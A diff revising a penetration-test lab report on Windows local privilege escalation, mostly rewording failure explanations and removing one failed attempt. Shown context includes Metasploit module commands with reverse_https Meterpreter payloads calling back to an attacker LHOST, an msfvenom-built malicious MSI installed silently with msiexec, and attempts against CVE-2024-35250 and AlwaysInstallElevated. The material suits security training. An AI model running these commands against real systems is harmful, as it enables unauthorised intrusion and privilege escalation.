@@ -416,7 +416,7 @@ run
 
 **Result:** Exploit launched `notepad.exe` as the injection host and reflectively injected a DLL into the process. New Meterpreter sessions were opened however all sessions returned `DESKTOP-H53BPAA\Apollo` on `getuid`. The kernel driver exploitation completed the DLL injection but failed to elevate the process token to SYSTEM. `getsystem` was attempted on all resulting sessions and failed with error 1346.
 
-**Root Cause of Failure:** The Metasploit implementation of CVE-2024-35250 failed to complete the token privilege escalation step on Build 19045.6456. The exploit confirmed vulnerability via ks.sys presence but the token swap did not complete.
+**Root Cause of Failure:** The Metasploit implementation of CVE-2024-35250 failed to complete the token privilege escalation step on Build 19045.6456. The exploit confirmed vulnerability via ks.sys presence but the token swap did not complete. Most likely this was due to the machine being patched with a fix to this CVE.
 
 ---
 
@@ -448,7 +448,7 @@ run
 
 **Result:** `Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module.`
 
-**Root Cause of Failure:** UAC bypass modules require the user to already be a member of the local Administrators group. Apollo is a standard user with no administrative privileges, making all UAC bypass techniques inapplicable.
+**Root Cause of Failure:** UAC bypass modules require the user to already be a member of the local Administrators group. Apollo is a standard user with no administrative privileges, which made all UAC bypass techniques inapplicable.
 
 ---
 
@@ -463,25 +463,11 @@ set payload windows/x64/meterpreter/reverse_https
 run
 ```
 
-**Result:** Failed for the same reason as fodhelper — Apollo is not in the local Administrators group. UAC bypass techniques require existing administrative group membership to function.
+**Result:** Failed for the same reason as fodhelper. Apollo is not in the local Administrators group. UAC bypass techniques require existing administrative group membership to function.
 
 ---
 
-**Attempt 5: ms16_032_secondary_logon_handle_privesc**
-
-```bash
-use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
-set SESSION 1
-set LHOST 192.168.92.136
-set LPORT 15000
-run
-```
-
-**Result:** Module only supports x86 architecture. Target is x64. Incompatible architecture — module not applicable.
-
----
-
-**Attempt 6: AlwaysInstallElevated (Module)**
+**Attempt 5: AlwaysInstallElevated (Module)**
 
 Registry keys were configured to enable AlwaysInstallElevated:
 
@@ -501,11 +487,11 @@ set payload windows/x64/meterpreter/reverse_https
 run
 ```
 
-**Result:** New session opened but returned `DESKTOP-H53BPAA\Apollo` on `getuid`. `getsystem` failed on resulting session.
+**Result:** New session opened but returned `DESKTOP-H53BPAA\Apollo` on `getuid`. `getsystem` failed on the resulting session.
 
 ---
 
-**Attempt 7: AlwaysInstallElevated (Manual MSI)**
+**Attempt 6: AlwaysInstallElevated (Manual MSI)**
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https \
@@ -527,13 +513,13 @@ msiexec /quiet /qn /i C:\temp\evil.msi
 
 The repeated failures across multiple vectors can be attributed to two root causes:
 
-**1. Apollo is a Pure Standard User** — Unlike typical lab setups where the compromised user is in the local Administrators group (making UAC bypass viable), Apollo has no administrative group membership and no impersonation privileges. This eliminated the majority of available Metasploit LPE modules which assume at minimum local admin group membership.
+**1. Apollo is a Standard User:** Unlike many smaller environments where the compromised user is in the local Administrators group (making UAC bypass viable), Apollo has no administrative group membership and no impersonation privileges. This eliminated the majority of available Metasploit LPE modules which assume at minimum local admin group membership.
 
-**2. Metasploit Module Implementation Gaps** — CVE-2024-35250 was confirmed vulnerable by both the exploit suggester and the module's own autocheck, however the Metasploit implementation failed to complete the token elevation step consistently across multiple attempts. This reflects a known gap between vulnerability confirmation and reliable exploitation in framework implementations.
+**2. Metasploit Module Implementation Gaps:** CVE-2024-35250 was confirmed vulnerable by both the exploit suggester and the module's own autocheck, however, the Metasploit implementation failed to complete the token elevation step consistently across multiple attempts.
 
 #### Selected LPE Vector: Weak Service Binary Permissions
 
-Given the above findings, an intentional misconfiguration was introduced to simulate a realistic LPE scenario — a SYSTEM service with a binary writable by standard users. This is one of the most commonly encountered LPE vectors in real-world penetration tests and directly reflects findings from Phase 2 enumeration where multiple SYSTEM services were identified running from potentially vulnerable paths.
+Given the above findings, an intentional misconfiguration was introduced to simulate a realistic LPE scenario. A SYSTEM service with a binary writable by standard users. This is one of the most commonly encountered LPE vectors in penetration tests and reflects findings from Phase 2 enumeration where multiple SYSTEM services were identified running from potentially vulnerable paths.
 
 **Name:** Weak Service Binary Permissions (Insecure Service Configuration)
 
